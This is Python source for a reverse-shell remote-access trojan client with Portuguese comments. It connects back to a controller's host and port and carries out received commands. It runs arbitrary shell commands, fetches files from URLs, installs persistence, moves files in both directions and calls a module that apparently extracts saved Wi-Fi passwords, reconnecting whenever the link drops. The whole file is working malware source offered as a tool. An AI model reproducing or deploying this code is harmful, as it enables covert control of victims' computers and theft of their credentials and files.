#! -*- coding:utf-8 -*-

import os
import sys
import time
import socket
import subprocess
import random
import glob
import getpass

# my lib's
import HTTPServer as http 
from toolkit import wget
import persistence
import files
import wifi

if sys.platform.startswith('win'):
        PLAT = 'win'
elif sys.platform.startswith('linux'):
        PLAT = 'nix'
elif sys.platform.startswith('darwin'):
        PLAT = 'mac'
else:
        print ('This platform is not supported.')
        sys.exit(1)

class cores:
        if PLAT == 'nix':
                PURPLE = '\033[95m'
                CYAN = '\033[96m'
                DARKCYAN = '\033[36m'
                BLUE = '\033[94m'
                GREEN = '\033[92m'
                YELLOW = '\033[93m'
                RED = '\033[91m'
                BOLD = '\033[1m'
                UNDERL = '\033[4m'
                ENDC = '\033[0m'
                backBlack = '\033[40m'
                backRed = '\033[41m'
                backGreen = '\033[42m'
                backYellow = '\033[43m'
                backBlue = '\033[44m'
                backMagenta = '\033[45m'
                backCyan = '\033[46m'
                backWhite = '\033[47m'
        else:
                PURPLE = ''
                CYAN = ''
                DARKCYAN = ''
                BLUE = ''
                GREEN = ''
                YELLOW = ''
                RED = ''
                BOLD = ''
                UNDERL = ''
                ENDC = ''
                backBlack = ''
                backRed = ''
                backGreen = ''
                backYellow = ''
                backBlue = ''
                backMagenta = ''
                backCyan = ''
                backWhite = ''


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip =  "127.0.0.1"
port = 2890
user = getpass.getuser()
local = socket.gethostname()

def ps1():
	return cores.DARKCYAN+"┌──["+cores.ENDC+cores.RED+user+cores.ENDC+cores.YELLOW+"@"+cores.ENDC+local+cores.ENDC+cores.DARKCYAN+"]-["+cores.ENDC+cores.BLUE+os.getcwd()+cores.ENDC+cores.DARKCYAN+"]\n└──╼ #"+cores.ENDC
	
"""
#
#
#
#    funcao para se conectar ao socket
#
#
#
"""
def conexao(ip, port):
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip,port))
		s.send("\n"+"Conectado a maquina: "+user+" ;)"+"\n\n")
		return s
	except:
		time.sleep(5)
		error(s)



def shell(s):
	try:
		while True:
			dados = s.recv(1024)
			if "wget" in dados:
				url = dados.split(" ")
				url[1].replace("\n","")
				resutado = wget(url[1].replace("\n",""))
				s.send(resutado)
				s.close()
				conexao(ip,port)
			elif "persistence" in dados:
				resu = persistence.run(PLAT)
				s.send(resu)
			elif "WebServer" in dados:
				http.test()
			elif "tes_exe" in dados:
				path = sys.executable
				s.send(path+"\n\n")
			elif "cd" in dados:
				x = dados.split(" ")
				if len(x) == 2:
					path = x[1].replace("\n","")
					try:
						os.chdir(path)
						s.send("\ndiretorio mudado para "+path+"\n")
					except:
						s.send("diretorio não encontrado")
				else:
					s.send("usado: cd <diretorios aaaa>")
			elif "execute" in dados:
				c = dados.split(" ")
				if len(c) == 2:
					progama = c[1].replace("\n","")
					os.system(progama)
					if c[1] == "--help":
						s.send("usado: execute <progama_para_executar>"+ps1())	
				else:
					s.send("[-]Erro ao executar: "+dados)
			elif "baixar" in dados:
				name = dados.replace("baixar ","")
				data = files.download_server(name)
				s.send(data)
				if "#" in s.recv(1024):
					s.send("[+] Download concluido")
			elif "upload" in dados:
				nome = dados.replace("upload ","")
				data = s.recv(1024)
				s.send(files.upload_server(nome,data))
			elif "prompt" in dados:
				s.send(ps1())
			elif "wifi-psk" in dados:
				s.send(wifi.run(s))
			else:
				proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				sida = proc.stdout.read() + proc.stderr.read()
				try:
					s.send("\n"+sida)
				except Exception as e:
					print e
					error(s)
	except Exception as e:
		print e
		error(s)

def error(s):
	s = socket.socket()
	if s:
		s.close()
	main(s)




def main(s):
	while True:
		try:
			s_connect = conexao(ip, port)
			if (s_connect):
				shell(s_connect)
			else:
				time.sleep(5)
				print("conectando novamente")
		except KeyboardInterrupt:
			sys.exit()



if __name__ == "__main__":
	main(s)

